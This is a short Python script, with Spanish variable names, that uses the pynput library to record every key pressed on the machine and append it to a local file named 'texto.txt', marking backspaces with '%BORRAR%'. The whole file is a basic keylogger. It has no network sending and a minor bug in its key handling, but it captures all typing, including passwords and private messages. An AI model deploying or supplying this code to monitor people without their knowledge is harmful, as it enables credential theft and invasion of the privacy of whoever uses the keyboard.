from pynput.keyboard import Listener

archivo = open("texto.txt", "a")

def on_press(tecla):
	tecla = str(tecla)
	if tecla == 'Key.enter':
		archivo.write('\n')
	if tecla == 'Key.space':
		archivo.write(' ')
	if tecla == 'Key.backspace':
		archivo.write('%BORRAR%') 
	else:
		#temp = tecla.replace("'", "")
		#archivo.write(temp)
		archivo.write(tecla.replace("'", ""))
		

with Listener(on_press=on_press) as l:
    l.join()
